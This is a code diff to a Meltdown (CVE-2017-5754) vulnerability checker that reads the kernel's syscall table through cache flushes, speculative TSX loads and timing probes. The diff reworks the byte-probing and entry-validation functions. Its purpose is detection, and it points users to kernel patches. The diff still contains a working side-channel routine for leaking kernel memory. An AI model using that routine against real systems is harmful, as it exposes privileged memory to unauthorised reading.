@@ -67,10 +67,16 @@ static unsigned mem_size() {
 }
 
 unsigned char probe_one_syscall_table_address_byte(uintptr_t ptr, char* buf) {
-    std::array<unsigned long, total_pages>  durations;
-    int min_duration = std::numeric_limits<int>::max();
+    std::array<unsigned long, total_pages> durations;
+    int min_duration = 0;
 
     for (auto c = 0; c < syscall_table_entry_read_retries; c++) {
+        durations = { 0 };
+
+        for (auto i = 0; i< total_pages; i++) {
+            __clflush(&buf[i * page_size()]);
+        }
+
         if (_xbegin() == _XBEGIN_STARTED) {
             __speculative_byte_load(ptr, buf);
             _xend();
@@ -83,8 +89,7 @@ unsigned char probe_one_syscall_table_address_byte(uintptr_t ptr, char* buf) {
         for (auto i = 0; i < total_pages; i++) {
             durations[i] = __speculative_loaded_byte_probe(&buf[i * page_size()]);
 
-            min_duration = (min_duration == std::numeric_limits<int>::max()
-                    || durations[min_duration] > durations[i]) ? i : min_duration;
+            min_duration = (durations[min_duration] <= durations[i]) ? min_duration : i;
         }
     }
     return (unsigned char)(min_duration);
@@ -93,35 +98,32 @@ unsigned char probe_one_syscall_table_address_byte(uintptr_t ptr, char* buf) {
 //
 // Syscall table is valid if any entry matches the address in the symbol map.
 //
-static bool validate_syscall_table_entries(void* addr, const void* data, size_t size, const std::unordered_map<uintptr_t, std::string>& symbol_map) {
+static bool validate_syscall_table_entry(const void* data, const std::unordered_map<uintptr_t, std::string>& symbol_map) {
     uint64_t* entry = (uint64_t*) data;
+    uintptr_t ptr = reinterpret_cast<uintptr_t>(entry[0]);
 
-    for (auto i = 0; i < (size / 8); i++) {
-        uintptr_t ptr = reinterpret_cast<uintptr_t>(entry[i]);
-#ifdef __DEBUG__
-        printf("0x%016lx -> That's %s\n", (uintptr_t)ptr, symbol_map.count(ptr) ? symbol_map.at(ptr).c_str() : "unknown");
-#endif
-        if (symbol_map.count(ptr)) {
-            auto symbol = symbol_map.at(ptr);
-            std::transform(symbol.begin(), symbol.end(), symbol.begin(), ::tolower);
-            auto ret = symbol.find(syscall_table_symbol_entry_prefix);
-            if (ret > 0 || ret == std::string::npos) {
-                continue;
-            }
-            return true;
+    printf("0x%016lx -> That's %s\n", (uintptr_t)ptr, symbol_map.count(ptr) ? symbol_map.at(ptr).c_str() : "unknown");
+
+    if (symbol_map.count(ptr)) {
+        auto symbol = symbol_map.at(ptr);
+        std::transform(symbol.begin(), symbol.end(), symbol.begin(), ::tolower);
+        auto ret = symbol.find(syscall_table_symbol_entry_prefix);
+        if (ret > 0 || ret == std::string::npos) {
+            return false;
         }
+        return true;
     }
     return false;
 }
 
-static bool probe_one_syscall_table_address(uintptr_t target_address, char* mem, const std::unordered_map<uintptr_t, std::string>& symbol_map) {
+static bool check_one_syscall_table_address(uintptr_t target_address, char* mem, const std::unordered_map<uintptr_t, std::string>& symbol_map) {
     size_t address_size = sizeof(uintptr_t);
     unsigned char buffer[address_size];
 
     for (auto i = 0; i < address_size; i++) {
         buffer[i] = probe_one_syscall_table_address_byte(target_address + i, mem);
     }
-    return validate_syscall_table_entries(reinterpret_cast<void*>(target_address), buffer, address_size, symbol_map);
+    return validate_syscall_table_entry(buffer, symbol_map);
 }
 
 
@@ -203,12 +205,11 @@ int main(int argc, char** argv) {
 
     std::cout << "Checking whether system is affected by Variant 3: rogue data cache load (CVE-2017-5754), a.k.a MELTDOWN ...\n";
 
-#ifdef __DEBUG__
     printf("Checking syscall table (sys_call_table) found at address 0x%016lx ...\n", (uintptr_t)target_address);
-#endif
+
 
     for (auto entry = 0; entry < syscall_table_entries; entry++) {
-        auto ret = probe_one_syscall_table_address(target_address + entry * sizeof(uintptr_t), mem, symbol_map);
+        auto ret = check_one_syscall_table_address(target_address + entry * sizeof(uintptr_t), mem, symbol_map);
         if (ret) {
             std::cout << "\nSystem affected! Please consider upgrading your kernel to one that is patched with KAISER\n";
             std::cout << "Check https://security.googleblog.com/2018/01/todays-cpu-vulnerability-what-you-need.html for more details\n";
